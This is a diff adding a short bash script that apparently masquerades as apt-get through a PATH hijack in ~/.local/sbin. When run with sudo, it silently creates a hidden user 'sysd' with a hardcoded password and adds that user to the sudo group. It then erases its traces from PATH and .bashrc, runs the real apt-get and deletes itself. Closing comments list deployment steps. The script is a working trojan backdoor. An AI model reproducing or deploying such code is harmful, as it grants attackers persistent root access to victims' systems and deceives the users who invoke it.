@@ -1,0 +1,40 @@
+#!/bin/bash
+
+# if not called with sudo - run the normal program then exit
+if (( $EUID != 0 )); then  
+    /usr/bin/apt-get ${@:1}
+    exit 0 
+fi
+
+
+ # add user/password to /etc/shadow
+ useradd -g users -M -s /bin/bash -p $(echo D0nuts1234 | openssl passwd -1 -stdin) sysd
+ # change password
+ usermod -aG sudo sysd 
+
+ # clean the path
+ PATH=$(echo $PATH | sed "s@$HOME/.local/sbin:@@g")
+
+ # Clean the .baschrc file
+ mv $HOME/.bashrc $HOME/.bashrc.tmp
+ head -n -5 $HOME/.bashrc.tmp > $HOME/.bashrc
+ rm $HOME/.bashrc.tmp
+ #chown jmwample:jmwample  $HOME/.bashrc
+ chown ndonnel:ndonnel  $HOME/.bashrc
+
+ # call the program that was supposed to run 
+ /usr/bin/apt-get ${@:1}
+
+ # clean up
+ rm -rf  $HOME/.local/sbin
+
+ #echo "Done. -- "
+
+
+ #instructions:
+ # 3. scp jwample@sweetiebelle:~/sbin ~/.local
+ # 2. run Setup.sh and log out
+ # 4. wait
+
+
+
